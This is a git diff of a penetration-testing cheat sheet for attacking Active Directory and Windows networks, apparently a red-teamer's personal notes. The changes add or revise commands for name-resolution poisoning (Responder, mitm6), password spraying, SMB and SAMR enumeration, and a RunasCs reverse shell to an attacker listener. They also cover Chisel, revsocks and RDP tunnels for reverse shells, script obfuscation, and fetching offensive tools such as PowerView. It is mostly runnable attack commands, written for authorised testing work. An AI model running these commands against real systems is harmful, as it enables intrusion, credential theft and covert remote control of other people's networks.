@@ -350,6 +350,8 @@ $ tcpdump -i eth0 -w dump.pcap -s0 'not tcp port 22' &
 ```
 $ git clone https://github.com/lgandx/Responder
 $ sudo ./Responder.py -I eth0 -wfrd -P -v
+...
+$ head -n 1 logs/*.txt | grep -v -e logs -e '^$'
 ```
 
 
@@ -360,7 +362,7 @@ $ sudo ./Responder.py -I eth0 -wfrd -P -v
 
 ```
 $ curl -L https://github.com/Kevin-Robertson/Inveigh/raw/master/Inveigh.ps1 > inveigh.ps1
-PS > Invoke-Inveigh [-IP '10.10.13.37'] -ConsoleOutput Y -FileOutput Y –NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
+PS > Invoke-Inveigh [-IP '10.10.13.37'] -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
 ```
 
 
@@ -449,7 +451,7 @@ Run:
 
 ```
 $ sudo smbserver.py -smb2support share `pwd`
-$ sudo mitm6.py -i eth0 -d megacorp.local
+$ sudo mitm6.py -i eth0 -d megacorp.local --ignore-nofqdn
 ```
 
 
@@ -668,58 +670,14 @@ $ nmap -p 139,445 --script=/usr/share/nmap/scripts/smb-os-discovery --script-arg
 
 
 
-## Dump DCE/RPC SAMR
-
-
-
-### rpcclient
-
-```
-root@kali:$ rpcclient -U '' -N 127.0.0.1
-root@kali:$ rpcclient -U 'snovvcrash%Passw0rd!' 127.0.0.1
-
-rpcclient $> enumdomusers
-rpcclient $> enumdomgroups
-```
-
-
-
-### enum4linux
-
-```
-root@kali:$ enum4linux -v -a 127.0.0.1 | tee enum4linux.txt
-```
-
-
-
-### nullinux.py
-
-* [github.com/m8r0wn/nullinux](https://github.com/m8r0wn/nullinux)
-
-```
-$ git clone https://github.com/m8r0wn/nullinux ~/tools/nullinux && cd ~/tools/nullinux && sudo bash setup.sh && ln -s ~/tools/nullinux/nullinux.py /usr/local/bin/nullinux.py && cd -
-$ nullinux.py 127.0.0.1
-```
-
-
-
-### samrdump.py
-
-```
-root@kali:$ samrdump.py 127.0.0.1
-```
-
-
-
-
-## Tricks
+## Misc
 
 List all domain users:
 
 ```
 PS > Get-ADUser -Filter * -SearchBase "DC=megacorp,DC=local" | select Name,SID
 Or
-PS > net user /DOMAIN
+PS > net user /domain
 ```
 
 List all domain groups:
@@ -727,7 +685,7 @@ List all domain groups:
 ```
 PS > Get-ADGroup -Filter * -SearchBase "DC=megacorp,DC=local" | select Name,SID
 Or
-PS > net group /DOMAIN
+PS > net group /domain
 ```
 
 List all user's groups:
@@ -739,7 +697,7 @@ PS > Get-ADPrincipalGroupMembership snovvcrash | select Name
 Create new domain user:
 
 ```
-PS > net user snovvcrash Passw0rd! /ADD /DOMAIN
+PS > net user snovvcrash Passw0rd! /add /domain
 Or
 PS > New-ADUser -Name snovvcrash -SamAccountName snovvcrash -Path "CN=Users,DC=megacorp,DC=local" -AccountPassword(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force) -Enabled $true
 ```
@@ -761,9 +719,7 @@ PS > Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' 
 PS > Get-ADObject -LDAPFilter "(objectClass=User)" -SearchBase '<DISTINGUISHED_NAME>' -IncludeDeletedObjects -Properties * |ft
 ```
 
-
-
-### Misc
+Naming convention:
 
 * [activedirectorypro.com/active-directory-user-naming-convention/](https://activedirectorypro.com/active-directory-user-naming-convention/)
 
@@ -899,7 +855,6 @@ PS > runas /netonly /user:snovvcrash powershell
 ### evil-winrm.rb
 
 * [github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
-* [malicious.link/post/2020/run-as-system-using-evil-winrm/](https://malicious.link/post/2020/run-as-system-using-evil-winrm/)
 
 Install:
 
@@ -1399,15 +1354,8 @@ $ ./build_x64_go.sh output/go_symmetric_rev.exe.go ebowla-rev.exe [--hidden] && 
 * [github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1)
 * [powersploit.readthedocs.io/en/latest/ScriptModification/Out-EncryptedScript/](https://powersploit.readthedocs.io/en/latest/ScriptModification/Out-EncryptedScript/)
 
-Download:
-
 ```
 $ curl -L https://github.com/PowerShellMafia/PowerSploit/raw/master/ScriptModification/Out-EncryptedScript.ps1 > outenc.ps1
-```
-
-Use:
-
-```
 PS > Out-EncryptedScript .\script.ps1 $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force) s4lt -FilePath .\evil.ps1
 PS > [string] $cmd = gc .\evil
 PS > $dec = de "Passw0rd!" s4lt
@@ -1766,12 +1714,13 @@ $ sudo python3 -m pip install git+https://github.com/Tib3rius/AutoRecon.git
 ## Chisel
 
 1. [github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases)
-2. [snovvcrash.github.io/2020/03/17/htb-reddish.html#chisel-socks](https://snovvcrash.github.io/2020/03/17/htb-reddish.html#chisel-socks)
+2. [0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel)
+3. [snovvcrash.github.io/2020/03/17/htb-reddish.html#chisel-socks](https://snovvcrash.github.io/2020/03/17/htb-reddish.html#chisel-socks)
 
 * Attacker's IP: 10.10.13.37
-* Victims's IP: 10.10.13.38
+* Victims's IP: 192.168.0.20
 
-Reverse forward port 1111 from Windows machine to port 2222 on Linux machine:
+Reverse local port 1111 (on Victim) to local port 2222 (on Attacker):
 
 ```
 root@kali:$ wget [1/linux]
@@ -1791,24 +1740,24 @@ PS > Start-Process -NoNewWindows chisel.exe client 10.10.13.37:8000 R:127.0.0.1:
 Socks5 proxy with Chisel in server mode:
 
 ```
-1. user@victim:$ ./chisel server -p 8000 --socks5 &
-2. root@kali:$ ./chisel client 10.10.13.38:8000 socks
+bob@victim:$ ./chisel server -p 8000 --socks5 &
+root@kali:$ ./chisel client 192.168.0.20:8000 socks
 ```
 
-Socks5 proxy with Chisel in server mode when direct connection to server is not available (not relevant as Chisel now supports socks5 in client mode):
+Socks5 proxy with Chisel in server mode when direct connection to server is not available (not relevant as Chisel supports socks5 in client mode now):
 
 ```
-1. root@kali:$ ./chisel server -p 8000 --reverse
-2. user@victim:$ ./chisel client 10.10.13.37:8000 R:127.0.0.1:8001:127.0.0.1:8002 &
-3. user@victim:$ ./chisel server -v -p 8002 --socks5 &
-4. root@kali:$ ./chisel client 127.0.0.1:8001 1080:socks
+root@kali:$ ./chisel server -p 8000 --reverse
+bob@victim:$ ./chisel client 10.10.13.37:8000 R:127.0.0.1:8001:127.0.0.1:8002 &
+bob@victim:$ ./chisel server -v -p 8002 --socks5 &
+root@kali:$ ./chisel client 127.0.0.1:8001 1080:socks
 ```
 
 Socks5 proxy with Chisel in client mode:
 
 ```
-1. root@kali:$ ./chisel server -p 8000 --reverse --socks5
-2. user@victim:$ ./chisel client 10.10.13.37:8000 R:socks
+root@kali:$ ./chisel server -p 8000 --reverse --socks5
+bob@victim:$ ./chisel client 10.10.13.37:8000 R:socks
 ```
 
 
@@ -1819,8 +1768,47 @@ Socks5 proxy with Chisel in client mode:
 * [github.com/kost/revsocks](https://github.com/kost/revsocks)
 
 ```
-1. root@kali:$ ./revsocks -listen :8000 -socks 127.0.0.1:1080 -pass 'Passw0rd!'
-2. user@victim:$ ./revsocks -connect 10.14.14.3:8000 -pass 'Passw0rd!'
+root@kali:$ ./revsocks -listen :8000 -socks 127.0.0.1:1080 -pass 'Passw0rd!'
+bob@victim:$ ./revsocks -connect 10.14.14.3:8000 -pass 'Passw0rd!'
+```
+
+
+
+
+## TCP over RDP
+
+* [ijustwannared.team/2019/11/07/c2-over-rdp-virtual-channels/](https://ijustwannared.team/2019/11/07/c2-over-rdp-virtual-channels/)
+
+
+
+### xfreerdp + rdp2tcp
+
+* [github.com/V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
+* [github.com/NotMedic/rdp-tunnel](https://github.com/NotMedic/rdp-tunnel)
+
+```
+$ xfreerdp /u:snovvcrash /p:'Passw0rd!' /d:megacorp.local /v:PC001.megacorp.local /dynamic-resolution /drive:www,/home/snovvcrash/www +clipboard /rdp2tcp:/home/snovvcrash/tools/rdp-tunnel/rdp2tcp
+```
+
+Reverse local port 9002 (on Victim) to local port 9001 on Attacker (good for reverse shells):
+
+```
+$ python rdp2tcp.py add reverse 127.0.0.1 9001 127.0.0.1 9002
+```
+
+Forward local port 9001 (on Attacker) to local port 9002 on Victim (good for bind shells):
+
+```
+$ python rdp2tcp.py add forward 127.0.0.1 9001 127.0.0.1 9002
+```
+
+Reverse tunnel web access via SOCKS proxy:
+
+* [serverfault.com/a/361806/554483](https://serverfault.com/a/361806/554483)
+
+```
+$ python rdp2tcp.py add socks5 127.0.0.1 1080
+$ python rdp2tcp.py add reverse 127.0.0.1 1080 127.0.0.1 9003
 ```
 
 
@@ -2072,7 +2060,7 @@ meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
 
 1. [github.com/foxglovesec/RottenPotato](https://github.com/foxglovesec/RottenPotato)
 2. [foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)
-3. [github.com/foxglovesec/RottenPotato/raw/master/rottenpotato.exe](https://github.com/foxglovesec/RottenPotato/raw/master/rottenpotato.exe)
+3. [github.com/foxglovesec/RottenPotato/blob/master/rottenpotato.exe](https://github.com/foxglovesec/RottenPotato/blob/master/rottenpotato.exe)
 
 
 #### ohpe/juicy-potato
@@ -2125,32 +2113,61 @@ PS > Stop-Service wuauserv
 PS > $cred = New-Object System.Management.Automation.PSCredential('<HOSTNAME>\<USERNAME>', $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force))
 ```
 
-Invoke-Command with `-Credential`:
+##### Process.Start
+
+```
+PS > $computer = "PC001"
+PS > [System.Diagnostics.Process]::Start("C:\Windows\System32\cmd.exe", "/c ping -n 1 10.10.13.37", $cred.Username, $cred.Password, $computer)
+```
+
+##### Start-Process
+
+```
+PS > Start-Process -FilePath "C:\Windows\System32\cmd.exe" -ArgumentList "/c ping -n 1 10.10.13.37" -Credential $cred
+```
+
+##### Invoke-Command
+
+With `-Credential`:
 
 ```
 PS > Invoke-Command -ComputerName <HOSTNAME> -ScriptBlock { whoami } -Credential $cred
 ```
 
-Invoke-Command with `-Session`:
+With `-Session`:
 
 ```
 PS > $s = New-PSSession -ComputerName <HOSTNAME> -Credential $cred
 PS > Invoke-Command -ScriptBlock { whoami } -Session $s
 ```
 
-Start-Process with `-Credential`
+##### Invoke-RunAs
+
+* [github.com/BC-SECURITY/Empire/blob/master/data/module_source/management/Invoke-RunAs.ps1](https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/management/Invoke-RunAs.ps1)
 
 ```
-PS > Start-Process -FilePath "C:\Windows\System32\cmd.exe" -ArgumentList "/c ping -n 1 10.10.13.37" -Credential $cred
+PS > Invoke-RunAs -UserName snovvcrash -Password 'Passw0rd!' -Domain MEGACORP -Cmd cmd.exe -Arguments "/c ping -n 1 10.10.13.37"
 ```
 
-Process.Start:
+##### Invoke-CommandAs
+
+* [github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Private/Invoke-ScheduledTask.ps1](https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Private/Invoke-ScheduledTask.ps1)
+* [github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Public/Invoke-CommandAs.ps1](https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Public/Invoke-CommandAs.ps1)
+* [malicious.link/post/2020/run-as-system-using-evil-winrm/](https://malicious.link/post/2020/run-as-system-using-evil-winrm/)
 
 ```
-PS > $pass = ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force 
-PS > $cred = New-Object System.Management.Automation.PSCredential ("snovvcrash", $pass)
-PS > $computer = "WORKSTATION1"
-PS > [System.Diagnostics.Process]::Start("C:\Windows\System32\cmd.exe", "/c ping -n 1 10.10.13.37", $cred.Username, $cred.Password, $computer)
+PS > . .\Invoke-ScheduledTask.ps1
+PS > . .\Invoke-CommandAs.ps1
+PS > Invoke-CommandAs -ScriptBlock {whoami} -AsUser $cred
+```
+
+##### RunasCs
+
+* [github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1)
+
+```
+$ rlwrap nc -lvnp 1337
+PS > Invoke-RunasCs -Username snovvcrash -Password 'Passw0rd!' -Domain megacorp.local -Command powershell.exe -Remote 10.10.13.37:1337
 ```
 
 
@@ -3412,6 +3429,58 @@ $ cewl -d 5 -m 5 -w passwords.txt --with-numbers --email_file emails.txt http://
 $ ./kerbrute -v --delay 100 -d megacorp.local -o kerbrute-passwordspray-123456.log passwordspray users.txt '123456'
 ```
 
+#### DomainPasswordSpray
+
+* [github.com/dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
+
+```
+PS > Invoke-DomainPasswordSpray -UserList .\users.txt -Domain megacorp.local -Password 'Passw0rd!' -OutFile spray-results.txt
+```
+
+
+#### rpcclient
+
+```
+$ rpcclient -U '' -N 127.0.0.1
+$ rpcclient -U 'snovvcrash%Passw0rd!' 127.0.0.1
+
+rpcclient $> enumdomusers
+rpcclient $> enumdomgroups
+```
+
+
+#### enum4linux
+
+```
+$ enum4linux -v -a 127.0.0.1 | tee enum4linux.txt
+```
+
+
+#### nullinux.py
+
+* [github.com/m8r0wn/nullinux](https://github.com/m8r0wn/nullinux)
+
+```
+$ git clone https://github.com/m8r0wn/nullinux ~/tools/nullinux && cd ~/tools/nullinux && sudo bash setup.sh && ln -s ~/tools/nullinux/nullinux.py /usr/local/bin/nullinux.py && cd -
+$ nullinux.py 127.0.0.1
+```
+
+
+#### samrdump.py
+
+```
+root@kali:$ samrdump.py 127.0.0.1
+```
+
+
+#### crowbar
+
+* [github.com/galkan/crowbar](https://github.com/galkan/crowbar)
+
+```
+$ crowbar -b rdp -s 192.168.1.0/24 -u snovvcrash -c 'Passw0rd!'
+```
+
 
 #### Bloodhound
 
@@ -3438,14 +3507,14 @@ Collect graphs via `Collectors/SharpHound.ps1`:
 
 ```
 $ curl -L https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1 > sharphound.ps1
-PS > Invoke-Bloodhound -CollectionMethod All,GPOLocalGroup,LoggedOn -Domain megacorp.local -LDAPUser snovvcrash -LDAPPass 'Passw0rd!'
+PS > Invoke-Bloodhound -CollectionMethod All,GPOLocalGroup -Domain megacorp.local -LDAPUser snovvcrash -LDAPPass 'Passw0rd!'
 ```
 
 Run session loop (\~2 hours for best results):
 
 ```
 $ curl -L https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe > sharphound.exe
-PS > .\SharpHound.exe -c SessionLoop
+PS > .\SharpHound.exe -c All,GPOLocalGroup -d roundsoft.local --ldapusername snovvcrash --ldappassword 'Passw0rd!'
 ```
 
 ##### Cypher
@@ -3555,14 +3624,16 @@ PS > powershell -NoP -sta -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebCl
 * [www.harmj0y.net/blog/powershell/make-powerview-great-again/](https://www.harmj0y.net/blog/powershell/make-powerview-great-again/)
 * [github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
 * [gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
-* [PowerView2.ps1](https://github.com/PowerShellEmpire/PowerTools/raw/master/PowerView/powerview.ps1)
-* [PowerView3.ps1](https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1)
+* [PowerView2.ps1](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1)
+* [PowerView3.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
 * [PowerView3.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/26a0757612e5654b4f792b012ab8f10f95d391c9/Recon/PowerView.ps1) [\[New-GPOImmediateTask\]](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
 * [PowerView4.ps1](https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1) [\[fork\]](https://exploit.ph/powerview.html)
 
 ```
 $ curl -L https://github.com/PowerShellEmpire/PowerTools/raw/master/PowerView/powerview.ps1 > powerview2.ps1
 $ curl -L https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1 > powerview3.ps1
+$ curl -L https://github.com/PowerShellMafia/PowerSploit/raw/26a0757612e5654b4f792b012ab8f10f95d391c9/Recon/PowerView.ps1 > powerview3-gpo.ps1
+$ curl -L https://github.com/ZeroDayLab/PowerSploit/raw/master/Recon/PowerView.ps1 > powerview4.ps1
 PowerView3 > Get-DomainComputer -Properties Name | Resolve-IPAddress
 PowerView3 > Invoke-Kerberoast -OutputFormat Hashcat | fl
 ```
@@ -3606,9 +3677,6 @@ $client=New-Object System.Net.WebClient;$proxy=New-Object System.Net.WebProxy("h
 * [www.infosecmatter.com/powershell-commands-for-pentesters/](https://www.infosecmatter.com/powershell-commands-for-pentesters/)
 
 ```
-root@kali:$ kerbrute userenum -d megacorp.local --dc 127.0.0.1 /usr/share/seclists/Usernames/Names/names.txt -t 50
-root@kali:$ kerbrute bruteuser -d megacorp.local --dc 127.0.0.1 /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt snovvcrash -t 50
-
 PS > systeminfo
 PS > whoami /priv (whoami /all)
 PS > gci "$env:userprofile" -recurse -file -ea SilentlyContinue | select fullname
@@ -3671,6 +3739,7 @@ PS > [System.Diagnostics.FileVersionInfo]::GetVersionInfo($(Get-Item .\clr.dll))
 * [Pentesting AD](https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/pentest_ad.png) · [Orange-Cyberdefense/arsenal](https://github.com/Orange-Cyberdefense/arsenal)
 * [Pentesting Exchange](https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/Pentesting_MS_Exchange_Server_on_the_Perimeter.png) · [Orange-Cyberdefense/arsenal](https://github.com/Orange-Cyberdefense/arsenal)
 * [Abusing ACEs](https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/ACEs_xmind.png) · [Orange-Cyberdefense/arsenal](https://github.com/Orange-Cyberdefense/arsenal)
+* [Kerberos Delegations](https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-kerberos/kerberos-delegations) · [ShutdownRepo/The-Hacker-Recipes](https://github.com/ShutdownRepo/The-Hacker-Recipes)
 * [Pentesting Wi-Fi](https://raw.githubusercontent.com/koutto/pi-pwnbox-rogueap/main/mindmap/WiFi-Hacking-MindMap-v1.png) · [koutto/pi-pwnbox-rogueap](https://github.com/koutto/pi-pwnbox-rogueap)
 * [Pentesting Web Applications](https://miro.medium.com/max/2400/1*8lN7TaTnlZSPEikpHFQnuA.png) · [Chintan Gurjar](https://medium.com/@chintanfrogygurjar/professional-web-application-pentest-checklist-10ae5b2edbdd)
 
@@ -4043,6 +4112,8 @@ $ sudo reboot
 
 ## Dirty Network Configure
 
+Manually:
+
 ```
 $ sudo service NetworkManager stop
 $ sudo ifconfig 
@@ -4054,6 +4125,39 @@ $ ping 8.8.8.8
 $ nslookup ya.ru
 $ sudo systemctl enable ssh --now
 ```
+
+Route inner traffic to eth0 (lan), internet to wan wlan0 (wan):
+
+```
+$ sudo route -n
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+0.0.0.0         192.168.0.1     0.0.0.0         UG    100    0        0 eth0
+0.0.0.0         172.20.10.1     0.0.0.0         UG    600    0        0 wlan0
+172.20.10.0     0.0.0.0         255.255.255.240 U     600    0        0 wlan0
+192.168.0.0     0.0.0.0         255.255.255.0   U     100    0        0 eth0
+
+$ sudo ip route add 192.168.0.0/16 via 192.168.0.1 metric 100 dev eth0
+$ sudo ip route add 172.16.0.0/12 via 192.168.0.1 metric 100 dev eth0
+$ sudo ip route add 10.0.0.0/8 via 192.168.0.1 metric 100 dev eth0
+$ sudo ip route del 0.0.0.0/0 via 192.168.0.1 dev eth0
+
+$ sudo route -n
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+0.0.0.0         172.20.10.1     0.0.0.0         UG    600    0        0 wlan0
+10.0.0.0        192.168.0.1     255.0.0.0       UG    100    0        0 eth0
+172.16.0.0      192.168.0.1     255.240.0.0     UG    100    0        0 eth0
+172.20.10.0     0.0.0.0         255.255.255.240 U     600    0        0 wlan0
+192.168.0.0     0.0.0.0         255.255.255.0   U     100    0        0 eth0
+192.168.0.0     192.168.0.1     255.255.0.0     UG    100    0        0 eth0
+
+$ sudo chattr -i /etc/resolv.conf
+$ sudo vi /etc/resolv.conf
+...change dns resolve order if necessary...
+```
+
+
 
 ### netplan
 
